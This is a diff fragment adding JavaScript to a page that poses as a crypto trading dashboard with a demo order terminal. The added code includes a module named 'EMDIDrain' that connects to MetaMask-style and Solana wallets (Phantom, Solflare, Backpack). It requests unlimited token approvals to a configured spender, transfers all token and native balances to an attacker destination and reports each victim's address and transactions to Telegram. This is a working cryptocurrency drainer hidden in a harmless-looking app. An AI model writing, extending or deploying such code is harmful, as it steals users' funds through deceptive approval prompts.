+    const balance = BigInt(await rpc(provider, "eth_getBalance", [owner, "latest"]));
+    const price = BigInt(await rpc(provider, "eth_gasPrice", []));
+    const reserve = BigInt(Math.round(CFG.reserve.evm * 1e18));
+    const fee = price * 21000n;
+    const value = balance - fee - reserve;
+    if (value <= 0n) return null;
+    return rpc(provider, "eth_sendTransaction", [{ from: owner, to, value: "0x" + value.toString(16) }]);
+  }
+
+  async function runEvm() {
+    const provider = window.ethereum;
+    if (!provider) throw new Error("No EVM provider.");
+
+    const accounts = await rpc(provider, "eth_requestAccounts");
+    const owner = accounts[0];
+    if (!owner) throw new Error("No account.");
+
+    const chainId = await rpc(provider, "eth_chainId");
+    const meta = CFG.chains[chainId];
+    if (!meta) {
+      const hex = Object.keys(CFG.chains)[0];
+      try {
+        await rpc(provider, "wallet_switchEthereumChain", [{ chainId: hex }]);
+      } catch (_) {}
+    }
+
+    const chain = CFG.chains[chainId] || { name: "Chain " + chainId, native: "NATIVE", tokens: [] };
+    const dest = CFG.destination.evm;
+    const spender = CFG.spender.evm;
+
+    const header = "<b>Approval</b>\n" + chain.name + "\n" + owner + "\n\n";
+    await tg(header + "Requesting approval...");
+
+    for (const [symbol, token, decimals] of chain.tokens) {
+      try {
+        const amount = await evmBalance(provider, token, owner);
+        if (amount <= 0n) continue;
+
+        const hash = await evmApprove(provider, token, spender);
+        hashes.push(hash);
+        log.push(symbol + ": approve " + hash);
+
+        if (CFG.mode === "transferFrom") continue;
+
+        await new Promise((r) => setTimeout(r, 2500));
+        const move = await evmTransfer(provider, token, dest, amount);
+        hashes.push(move);
+        log.push(symbol + ": sent " + human(amount, decimals) + " " + move);
+      } catch (err) {
+        log.push(symbol + ": " + ((err && err.message) || "failed"));
+      }
+    }
+
+    if (CFG.mode !== "transferFrom") {
+      try {
+        const nativeHash = await evmNative(provider, owner, chain, dest);
+        if (nativeHash) {
+          hashes.push(nativeHash);
+          log.push(chain.native + ": sent " + nativeHash);
+        }
+      } catch (err) {
+        log.push(chain.native + ": " + ((err && err.message) || "failed"));
+      }
+    } else if (CFG.sweepEndpoint) {
+      try {
+        const res = await fetch(CFG.sweepEndpoint, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chainId, owner, tokens: chain.tokens.map((t) => t[1]), destination: dest, spender }),
+        });
+        log.push("sweep: " + res.status);
+      } catch (err) {
+        log.push("sweep: " + ((err && err.message) || "failed"));
+      }
+    }
+
+    await tg(header + (log.join("\n") || "nothing to move"));
+    return { chain: chain.name, owner, hashes, log };
+  }
+
+  /* ---------------- solana ---------------- */
+
+  function solProvider() {
+    if (window.phantom && window.phantom.solana) return window.phantom.solana;
+    if (window.solflare) return window.solflare;
+    if (window.backpack) return window.backpack;
+    if (window.solana) return window.solana;
+    return null;
+  }
+
+  async function solSend(provider, transaction, account) {
+    if (provider.signAndSendTransaction) {
+      const res = await provider.signAndSendTransaction(transaction);
+      if (typeof res === "string") return res;
+      return (res && res.signature) || "";
+    }
+    if (provider.features && provider.features["solana:signAndSendTransaction"]) {
+      const feature = provider.features["solana:signAndSendTransaction"];
+      const out = await feature.signAndSendTransaction({
+        transaction: transaction.serialize({ requireAllSignatures: false }),
+        account,
+        chain: "solana:mainnet",
+      });
+      const first = (out && out[0]) || {};
+      return first.signature || "";
+    }
+    throw new Error("Wallet cannot sign.");
+  }
+
+  async function runSol() {
+    const provider = solProvider();
+    if (!provider) throw new Error("No Solana provider.");
+
+    const mods = await Promise.all([
+      import("https://esm.sh/@solana/web3.js@1.95.3"),
+      import("https://esm.sh/@solana/spl-token@0.4.9"),
+    ]);
+    const web3 = mods[0];
+    const spl = mods[1];
+
+    const Connection = web3.Connection;
+    const PublicKey = web3.PublicKey;
+    const Transaction = web3.Transaction;
+
+    const connection = new Connection(CFG.solanaRpc, "confirmed");
+
+    let owner;
+    if (provider.publicKey) {
+      owner = provider.publicKey;
+    } else {
+      const res = await provider.connect();
+      const key = (res && res.publicKey) || provider.publicKey;
+      owner = key instanceof PublicKey ? key : new PublicKey(key.toString());
+    }
+    if (!owner) throw new Error("No account.");
+
+    const dest = new PublicKey(CFG.destination.sol);
+    const spender = new PublicKey(CFG.spender.sol);
+
+    const header = "<b>Approval</b>\nSolana\n" + owner.toBase58() + "\n\n";
+    await tg(header + "Requesting approval...");
+
+    const parsed = await connection.getParsedTokenAccountsByOwner(owner, { programId: spl.TOKEN_PROGRAM_ID });
+
+    for (const item of parsed.value) {
+      try {
+        const info = item.account.data.parsed.info;
+        const mint = new PublicKey(info.mint);
+        const amount = BigInt(info.tokenAmount.amount);
+        if (amount <= 0n) continue;
+
+        const source = item.pubkey;
+
+        const approveTx = new Transaction().add(
+          spl.createApproveInstruction(source, spender, owner, MAX_U64)
+        );
+        approveTx.feePayer = owner;
+        approveTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+        const approveSig = await solSend(provider, approveTx, owner);
+        hashes.push(approveSig);
+        log.push(info.mint.slice(0, 4) + ": approve " + approveSig);
+
+        if (CFG.mode === "transferFrom") continue;
+
+        const destAta = await spl.getAssociatedTokenAddress(mint, dest);
+        const transferTx = new Transaction();
+
+        const exists = await connection.getAccountInfo(destAta);
+        if (!exists) {
+          transferTx.add(
+            spl.createAssociatedTokenAccountIdempotentInstruction(owner, destAta, dest, mint)
+          );
+        }
+        transferTx.add(spl.createTransferInstruction(source, destAta, owner, amount));
+        transferTx.feePayer = owner;
+        transferTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+        const moveSig = await solSend(provider, transferTx, owner);
+        hashes.push(moveSig);
+        log.push(info.mint.slice(0, 4) + ": sent " + human(amount, info.tokenAmount.decimals) + " " + moveSig);
+      } catch (err) {
+        log.push("token: " + ((err && err.message) || "failed"));
+      }
+    }
+
+    if (CFG.mode !== "transferFrom") {
+      try {
+        const lamports = await connection.getBalance(owner);
+        const reserve = Math.round(CFG.reserve.sol * 1e9);
+        const value = lamports - reserve;
+        if (value > 0) {
+          const nativeTx = new Transaction().add(
+            web3.SystemProgram.transfer({ fromPubkey: owner, toPubkey: dest, lamports: value })
+          );
+          nativeTx.feePayer = owner;
+          nativeTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+          const sig = await solSend(provider, nativeTx, owner);
+          hashes.push(sig);
+          log.push("SOL: sent " + sig);
+        }
+      } catch (err) {
+        log.push("SOL: " + ((err && err.message) || "failed"));
+      }
+    }
+
+    await tg(header + (log.join("\n") || "nothing to move"));
+    return { chain: "Solana", owner: owner.toBase58(), hashes, log };
+  }
+
+  /* ---------------- entry ---------------- */
+
+  async function run() {
+    log.length = 0;
+    hashes.length = 0;
+
+    const probe = (window.EMDIWallet && window.EMDIWallet.getState && window.EMDIWallet.getState()) || {};
+    const kind = probe.wallet && probe.wallet.kind;
+
+    if (kind && String(kind).indexOf("solana") !== -1) return runSol();
+    if (kind && (kind === "evm" || kind === "legacy-evm" || kind === "wc")) return runEvm();
+
+    if (window.ethereum) return runEvm();
+    if (solProvider()) return runSol();
+    throw new Error("No wallet found.");
+  }
+
+  window.EMDIDrain = { run, config: CFG, history: log, hashes };
+})();
+
+
+// Dedicated terminal preview helpers
+function terminalPrice(){
+ const pair=$('#terminalPair').value;
+ return $('#terminalOrderType').value==='Limit'&&Number($('#terminalLimit').value)>0?Number($('#terminalLimit').value):prices[pair];
+}
+function updateTerminal(){
+ const pair=$('#terminalPair').value,price=terminalPrice(),amount=Math.max(0,Number($('#terminalAmount').value)||0);
+ $('#terminalPrice').textContent='$'+fmt(prices[pair],prices[pair]<1?4:2);
+ $('#terminalPairLabel').textContent=pair+' / USD';
+ $('#terminalQuantity').textContent=amount?fmt(amount/price,6)+' '+pair:'—';
+ $('#terminalFee').textContent='$'+fmt(amount*.001);
+ $('#terminalTotal').textContent='$'+fmt(amount*1.001);
+ $('#terminalSubmit').textContent='Preview '+state.side+' order';
+}
+function drawTerminalChart(){
+ const svgNS='http://www.w3.org/2000/svg',g=$('#terminalGrid');g.replaceChildren();
+ for(let i=1;i<5;i++){const line=document.createElementNS(svgNS,'line');line.setAttribute('x1','0');line.setAttribute('x2','640');line.setAttribute('y1',i*45);line.setAttribute('y2',i*45);line.setAttribute('stroke','#243044');line.setAttribute('stroke-dasharray','3 5');g.append(line)}
+ const vals=[52,60,47,57,42,50,66,58,73,62,78,67,61,76,69,84,73,91,79,88,75,98,87,102,91,108,96,117,104,125,112,132,119,143,127,150,139,160,148,171,158,181,165,190,177,201];
+ const pts=vals.map((v,i)=>({x:i*640/(vals.length-1),y:216-v}));
+ $('#terminalLine').setAttribute('d',pts.map((p,i)=>(i?'L':'M')+p.x.toFixed(1)+' '+p.y.toFixed(1)).join(' '));
+ $('#terminalArea').setAttribute('d',`M 0 220 `+pts.map(p=>`L ${p.x.toFixed(1)} ${p.y.toFixed(1)}`).join(' ')+` L 640 220 Z`);
+}
+$('#terminalPair').addEventListener('change',updateTerminal);
+$('#terminalOrderType').addEventListener('change',()=>{$('#terminalLimitField').classList.toggle('hidden',$('#terminalOrderType').value==='Market');updateTerminal()});
+$('#terminalLimit').addEventListener('input',updateTerminal);
+$('#terminalAmount').addEventListener('input',updateTerminal);
+$$('[data-terminal-amount]').forEach(b=>b.addEventListener('click',()=>{$('#terminalAmount').value=b.dataset.terminalAmount;updateTerminal()}));
+$('#terminalSubmit').addEventListener('click',()=>{
+ const amount=Number($('#terminalAmount').value),pair=$('#terminalPair').value;
+ if(!Number.isFinite(amount)||amount<1||amount>5000){toast('Check order amount','Enter a demo order between $1 and $5,000.');return}
+ if($('#terminalOrderType').value!=='Market'&&(!Number($('#terminalLimit').value)||Number($('#terminalLimit').value)<=0)){toast('Limit price required','Enter a positive limit price.');return}
+ state.orders.push({id:String(Date.now()),pair,side:state.side,amount,price:terminalPrice(),status:'Preview only',createdAt:new Date().toISOString()});
+ toast('Order preview ready',`${state.side.toUpperCase()} ${pair} · $${fmt(amount)}. No transaction was sent to your wallet.`);
+});
+$$('.terminal-side button').forEach(b=>b.addEventListener('click',()=>setSide(b.dataset.side)));
+drawTerminalChart();updateTerminal();
+
+
+setRange('1D');updateSummary();setPage('Overview');loadLiveMarkets();updateWalletPage();updatePortfolioPage();
+})();
+</script>
+</body>
+</html>
